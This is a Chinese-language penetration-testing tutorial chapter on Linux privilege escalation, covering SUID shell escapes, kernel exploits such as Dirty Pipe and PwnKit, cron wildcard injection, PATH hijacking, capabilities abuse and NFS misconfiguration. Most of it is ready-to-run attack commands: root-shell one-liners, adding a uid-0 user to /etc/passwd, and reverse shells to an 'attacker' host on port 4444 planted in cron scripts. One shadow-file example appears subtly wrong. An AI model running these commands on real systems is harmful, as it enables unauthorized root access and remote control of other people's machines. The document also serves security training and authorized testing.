# Linux提权技术

### 3.1 SUID提权

SUID（Set Owner User ID）位允许程序以文件属主权限执行。如果SUID程序属主是root，程序以root权限运行。

**查找SUID程序**

```bash
# 查找所有SUID程序
find / -perm -4000 -type f 2>/dev/null

# 查找SGID程序
find / -perm -2000 -type f 2>/dev/null

# 查找SUID和SGID
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null

# 查找可写的SUID程序（最佳利用目标）
find / -perm -4000 -type f -writable 2>/dev/null
```

**GTFOBins利用**

[GTFOBins](https://gtfobins.github.io) 是一个Unix程序利用数据库，记录了各种程序在SUID/sudo/capabilities条件下的利用方法。

常见SUID提权程序：

| 程序 | 利用方式 | 命令 |
|------|---------|------|
| nmap | 交互式Shell | `nmap --interactive` -> `!sh` |
| find | 命令执行 | `find . -exec /bin/sh \; -quit` |
| python | Shell | `python -c 'import os;os.system("/bin/sh")'` |
| perl | Shell | `perl -e 'exec "/bin/sh";'` |
| ruby | Shell | `ruby -e 'exec "/bin/sh"'` |
| bash | Shell | `bash -p` |
| less | Shell | `less /etc/passwd` -> `!/bin/sh` |
| more | Shell | `more /etc/passwd` -> `!/bin/sh` |
| cp | 文件复制 | 复制/etc/shadow或替换/etc/passwd |
| mv | 文件移动 | 替换系统文件 |
| vim | Shell | `vim -c ':!/bin/sh'` |
| env | Shell | `env /bin/sh` |
| awk | Shell | `awk 'BEGIN {system("/bin/sh")}'` |
| python3 | Shell | `python3 -c 'import pty;pty.spawn("/bin/sh")'` |
| nice | Shell | `nice /bin/sh` |
| timeout | Shell | `timeout 7 /bin/sh` |
| cpulimit | Shell | `cpulimit -l 100 -f /bin/sh` |

**利用示例**

```bash
# find SUID提权
find . -exec /bin/sh -p \; -quit

# python SUID提权
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# perl SUID提权
perl -e 'if($<==0){exec "/bin/sh"}else{print "Not root\n"}'

# vim SUID提权
vim.tiny -c ':!/bin/sh' /dev/null
# 或
echo ':!/bin/sh' | vim.tiny /dev/null

# cp 利用 - 复制并替换passwd
# 在攻击机上:
openssl passwd -1 -salt hacker password123  # 生成密码哈希
# $1$hacker$6rX9oXQ/v3Yn3pYv3wY3..
# 将哈希添加到/etc/passwd:
echo 'hacker:$1$hacker$6rX9oXQ/v3Yn3pYv3wY3..:0:0::/root:/bin/bash' >> /etc/passwd
```

**自定义SUID利用**

如果发现不常见的SUID程序，可以分析其行为：

```bash
# 使用strace跟踪系统调用
strace -f /usr/local/bin/suid_program 2>&1 | grep -E "execve|access|open"

# 使用ltrace跟踪库调用
ltrace /usr/local/bin/suid_program

# 检查程序调用的命令
strings /usr/local/bin/suid_program | grep -E "^/(bin|sbin|usr)"
```

### 3.2 内核漏洞提权

**Linux内核漏洞**

| CVE | 漏洞 | 影响内核版本 | 利用类型 |
|-----|------|-------------|---------|
| CVE-2022-0847 | Dirty Pipe | 5.8-5.16.10 | 管道任意写 |
| CVE-2021-4034 | PwnKit (pkexec) | 所有版本 | SUID漏洞 |
| CVE-2021-3156 | Baron Samedit | sudo < 1.9.5p2 | 堆溢出 |
| CVE-2020-14386 | 内存损坏 | < 5.9 | 内存损坏 |
| CVE-2019-13272 | ptrace | < 5.1.17 | PTRACE_TRACEME |
| CVE-2016-5195 | Dirty COW | 2.6.22-4.8.3 | 竞争条件 |
| CVE-2014-4699 | ptrace | < 3.15 | 内核指针泄露 |

**Dirty Pipe (CVE-2022-0847) 利用**

```bash
# 检查内核版本
uname -r

# Dirty Pipe利用 - 覆盖/etc/passwd添加root用户
# 编译exploit
gcc dirty_pipe.c -o dirty_pipe

# 利用
./dirty_pipe /etc/passwd

# 利用后恢复
# 原始文件备份在/tmp/passwd.bak
```

**PwnKit (CVE-2021-4034) 利用**

```bash
# 检查pkexec是否存在
which pkexec

# 编译利用
gcc cve-2021-4034.c -o pwnkit

# 执行
./pwnkit
# 直接获得root权限
```

**Dirty COW (CVE-2016-5195) 利用**

```bash
# 编译
gcc -pthread dirty.c -o dirty -lcrypt

# 利用 - 添加root用户
./dirty password123
# 使用 firefart/password123 登录
su firefart
```

**Linux版本检测**

```bash
# 内核版本
uname -a

# 发行版信息
cat /etc/*release
cat /etc/issue

# 使用linux-exploit-suggester
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/les.sh
chmod +x les.sh
./les.sh
```

### 3.3 Cron任务利用

Cron定时任务如果配置不当，可以用于提权。

**Cron任务查看**

```bash
# 查看系统cron任务
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 查看用户cron任务
crontab -l
ls -la /var/spool/cron/
cat /var/spool/cron/*
```

**通配符注入提权**

当cron任务中使用通配符时，可以利用tar的`--checkpoint`选项注入命令：

```bash
# 场景：cron任务定期备份
# */1 * * * * root tar czf /tmp/backup.tar.gz /var/www/html/*

# 在目标目录创建特殊文件名
cd /var/www/html/

# 创建--checkpoint文件
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# 创建恶意脚本
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> shell.sh
chmod +x shell.sh

# 等待cron执行tar
# tar会将--checkpoint=1和--checkpoint-action作为参数执行
# 从而执行shell.sh
```

**Cron脚本路径劫持**

```bash
# 场景：cron执行脚本使用相对命令
# */5 * * * * root /usr/local/bin/backup.sh

# 查看backup.sh内容
cat /usr/local/bin/backup.sh
# 如果脚本中使用相对命令如tar, gzip等

# 查看PATH环境变量
cat /etc/environment

# 如果cron脚本的PATH包含用户可写目录
# 创建恶意命令替代程序
echo '#!/bin/bash' > /tmp/tar
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /tmp/tar
chmod +x /tmp/tar

# 修改cron的PATH（如果有权限）或等待PATH劫持
```

**Cron脚本文件覆盖**

```bash
# 如果cron脚本本身可写
ls -la /usr/local/bin/backup.sh
# 如果-rwxrwxrwx（所有用户可写）

# 直接覆盖脚本内容
echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh

# 等待cron执行
```

### 3.4 PATH劫持

PATH环境变量劫持利用程序查找可执行文件的顺序：

```bash
# 查看当前PATH
echo $PATH

# 如果PATH中包含用户可写目录在前

# 场景：SUID程序调用无路径的命令
# 例如SUID程序执行 system("ps");
# 系统会按PATH顺序查找ps

# 创建恶意ps
mkdir /tmp/.hidden
echo '#!/bin/bash' > /tmp/.hidden/ps
echo 'python3 -c "import os;os.setuid(0);os.system(\"/bin/sh\")"' >> /tmp/.hidden/ps
chmod +x /tmp/.hidden/ps

# 修改PATH
export PATH=/tmp/.hidden:$PATH

# 执行SUID程序
/usr/local/bin/suid_program
# 程序调用ps时实际执行了恶意脚本
```

### 3.5 Linux Capabilities

Linux capabilities提供了比传统UID更细粒度的权限控制：

**查看文件capabilities**

```bash
# 查找带有capabilities的程序
getcap -r / 2>/dev/null

# 查看特定文件的capabilities
getcap /usr/bin/ping
```

**利用capabilities提权**

| Capability | 说明 | 利用方法 |
|------------|------|---------|
| cap_setuid | 改变UID | 改变为root UID |
| cap_setgid | 改变GID | 改变为root GID |
| cap_dac_override | 绕过文件权限 | 读写任意文件 |
| cap_chown | 改变文件属主 | 改变敏感文件属主 |
| cap_sys_admin | 系统管理 | 多种提权方式 |
| cap_sys_ptrace | 进程追踪 | 注入代码到进程 |
| cap_net_raw | 原始网络访问 | 网络嗅探 |
| cap_net_admin | 网络管理 | 网络配置修改 |

```bash
# cap_setuid利用
# 如果python3有cap_setuid
getcap /usr/bin/python3
# /usr/bin/python3 cap_setuid=ep

# 提权
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_override利用
# 如果vim有cap_dac_override
getcap /usr/bin/vim
# /usr/bin/vim cap_dac_override=ep

# 读取/etc/shadow
vim /etc/shadow
# 或直接:
echo 'hacker:$6$salt$hash:0:0::/root:/bin/bash' >> /etc/shadow

# cap_sys_ptrace利用
# 如果python3有cap_sys_ptrace
# 可以注入代码到root进程
python3 -c '
import ctypes
import os
# 注入到目标进程
# 实现略
'
```

### 3.6 NFS提权

如果NFS导出配置了`no_root_squash`，远程用户可以以root权限写入文件：

```bash
# 检查NFS导出
cat /etc/exports
# 如果有 no_root_squash 选项

# 在攻击机上挂载NFS
mkdir /tmp/nfs
mount -o vers=3 target:/shared /tmp/nfs

# 以root身份创建SUID bash
cp /bin/bash /tmp/nfs/bash
chmod 4755 /tmp/nfs/bash

# 在目标上执行
/shared/bash -p
# 获得root权限
```

### 3.7 Linux枚举脚本

**LinPEAS**

```bash
# 下载并运行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 或本地运行
chmod +x linpeas.sh
./linpeas.sh

# 输出会标注高概率提权路径为红色/黄色
```

**LinEnum**

```bash
# 下载
git clone https://github.com/rebootuser/LinEnum.git

# 运行
./LinEnum.sh

# 详细模式
./LinEnum.sh -t
```

**Linux Smart Enumeration (LSE)**

```bash
./lse.sh -l1  # 基础检查
./lse.sh -l2  # 中级检查
./lse.sh -l3  # 高级检查
```

**手动枚举脚本**

```bash
#!/bin/bash
echo "===== Linux Privilege Escalation Enumeration ====="
echo

echo "[1] System Information"
uname -a
cat /etc/*release 2>/dev/null
echo

echo "[2] Current User"
id
whoami
echo

echo "[3] Sudo Permissions"
sudo -l 2>/dev/null
echo

echo "[4] SUID/SGID Files"
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
echo

echo "[5] Capabilities"
getcap -r / 2>/dev/null
echo

echo "[6] Cron Jobs"
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
crontab -l 2>/dev/null
echo

echo "[7] World-Writable Files"
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
echo

echo "[8] Interesting Files"
find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null | head -50
find / -name "*.conf" -o -name "*.config" 2>/dev/null | head -50
echo

echo "[9] Password Files"
cat /etc/passwd | grep -v "nobody\|nologin\|false" 2>/dev/null
find / -name "*.htpasswd" -o -name ".htpasswd" 2>/dev/null
echo

echo "[10] SSH Keys"
find / -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null
echo

echo "[11] Network Information"
ip addr 2>/dev/null || ifconfig -a 2>/dev/null
netstat -tulpn 2>/dev/null
echo

echo "[12] Docker/LXD"
docker ps 2>/dev/null
lxc list 2>/dev/null
echo

echo "===== Enumeration Complete ====="
```

---

---

